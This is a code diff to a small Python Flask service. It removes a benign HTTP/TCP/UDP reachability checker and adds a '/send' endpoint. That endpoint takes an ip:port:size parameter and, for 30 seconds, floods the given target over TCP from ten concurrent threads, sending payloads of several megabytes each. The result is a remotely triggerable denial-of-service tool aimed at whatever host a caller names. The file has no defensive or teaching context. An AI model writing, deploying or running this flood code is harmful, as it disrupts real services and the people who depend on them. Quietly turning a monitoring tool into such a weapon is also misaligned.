@@ -1,146 +1,61 @@
 from flask import Flask, request, jsonify
-import requests
 import socket
-import asyncio
-import json
-import datetime
+import time
+from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
 
-def map_tcp_udp_error(error):
-    if error.errno == socket.errno.ECONNREFUSED:
-        return 'REFUSED'
-    elif error.errno == socket.errno.ETIMEDOUT:
-        return 'TIMED OUT'
-    elif error.errno == socket.errno.EHOSTUNREACH:
-        return 'HOST IS UNREACHABLE'
-    elif error.errno == socket.errno.ECONNRESET:
-        return 'RESET BY PEER'
-    else:
-        return f'Unknown error occurred: {error.strerror}'
+def send_packet(ip, port, packet):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.connect((ip, port))
+            sock.sendall(packet)
+            return True
+    except Exception as e:
+        return False
 
-@app.route('/http', methods=['GET'])
-def http_check():
-    url = request.args.get('url')
-    if not url:
-        return jsonify({
-            'status': 'failure',
-            'error': 'Missing required parameter: url',
-            'dateChecked': datetime.datetime.now().isoformat()
-        })
-
-    if not url.startswith(('http://', 'https://')):
-        host, port = (url.split(':') + [80])[:2]
-        protocol = 'https' if port == '443' else 'http'
-        formatted_url = f'{protocol}://{host}:{port}'
-    else:
-        formatted_url = url
-
-    start = datetime.datetime.now()
+@app.route('/send', methods=['GET'])
+def send_flood():
+    host_param = request.args.get('host', '')
 
     try:
-        response = requests.get(formatted_url)
-        response_time = (datetime.datetime.now() - start).total_seconds() * 1000
-        status = 'success' if response.status_code < 400 else 'failure'
+        # Parse host parameter
+        ip, port, size = host_param.split(':')
+        port = int(port)
+        size = int(size)  # Size in MB
+        packet_size = size * 1024 * 1024  # Convert MB to bytes
+        packet = b'a' * packet_size  # Create the packet
+        flood_duration = 30  # Duration of the flood in seconds
+        concurrent_count = 10  # Number of concurrent sends
+
+        start_time = time.time()
+        end_time = start_time + flood_duration
+
+        # Use ThreadPoolExecutor to manage concurrent sending
+        with ThreadPoolExecutor(max_workers=concurrent_count) as executor:
+            futures = []
+            while time.time() < end_time:
+                for _ in range(concurrent_count):
+                    futures.append(executor.submit(send_packet, ip, port, packet))
+
+            # Check results of futures
+            results = [future.result() for future in futures]
+            success_count = sum(1 for result in results if result)
+
         return jsonify({
-            'status': status,
-            'url': formatted_url,
-            'responseCode': response.status_code,
-            'responseStatus': response.reason,
-            'title': response.text.split('<title>')[1].split('</title>')[0] if '<title>' in response.text else 'No Title',
-            'responseTime': f'{response_time:.2f}ms',
-            'dateChecked': datetime.datetime.now().isoformat()
-        })
-    except requests.RequestException as e:
-        return jsonify({
-            'status': 'failure',
-            'url': formatted_url,
-            'error': f'{e.response.status_code if e.response else 500} - {e.response.reason if e.response else "Connection Timed Out."}',
-            'dateChecked': datetime.datetime.now().isoformat()
-        })
+            'status': 'success',
+            'message': f'Sent {concurrent_count * flood_duration} packets of {size} MB to {ip}:{port}',
+            'successful_sends': success_count,
+            'failed_sends': len(futures) - success_count
+        }), 200
 
-@app.route('/tcp', methods=['GET'])
-def tcp_check():
-    host = request.args.get('host')
-    port = request.args.get('port', 80)
-    if not host:
-        return jsonify({
-            'status': 'failure',
-            'error': 'Missing required parameter: host',
-            'dateChecked': datetime.datetime.now().isoformat()
-        })
+    except ValueError:
+        return jsonify({'status': 'error', 'message': 'Invalid host parameter format. Use format: ip:port:size'}), 400
 
-    try:
-        with socket.create_connection((host, int(port)), timeout=5):
-            return jsonify({
-                'status': 'success',
-                'host': host,
-                'port': port,
-                'message': f'Connection to {host}:{port} successful',
-                'dateChecked': datetime.datetime.now().isoformat()
-            })
-    except socket.error as e:
-        return jsonify({
-            'status': 'failure',
-            'host': host,
-            'port': port,
-            'error': map_tcp_udp_error(e),
-            'dateChecked': datetime.datetime.now().isoformat()
-        })
-    except socket.timeout:
-        return jsonify({
-            'status': 'failure',
-            'host': host,
-            'port': port,
-            'error': 'TIMED OUT',
-            'dateChecked': datetime.datetime.now().isoformat()
-        })
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
-@app.route('/udp', methods=['GET'])
-def udp_check():
-    host = request.args.get('host')
-    port = request.args.get('port', 80)
-    if not host:
-        return jsonify({
-            'status': 'failure',
-            'error': 'Missing required parameter: host',
-            'dateChecked': datetime.datetime.now().isoformat()
-        })
-
-    message = b'ping'
-
-    async def send_udp_message():
-        loop = asyncio.get_event_loop()
-        try:
-            await loop.run_in_executor(None, lambda: socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(message, (host, int(port))))
-            return {
-                'status': 'success',
-                'host': host,
-                'port': port,
-                'message': f'UDP message sent to {host}:{port} successfully',
-                'dateChecked': datetime.datetime.now().isoformat()
-            }
-        except socket.error as e:
-            return {
-                'status': 'failure',
-                'host': host,
-                'port': port,
-                'error': map_tcp_udp_error(e),
-                'dateChecked': datetime.datetime.now().isoformat()
-            }
-
-    result = asyncio.run(send_udp_message())
-    return jsonify(result)
-
-@app.errorhandler(Exception)
-def handle_exception(e):
-    return jsonify({
-        'status': 'failure',
-        'error': str(e),
-        'dateChecked': datetime.datetime.now().isoformat()
-    })
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=3000)
-
-    
+    app.run(host='0.0.0.0', port=5000)
+        
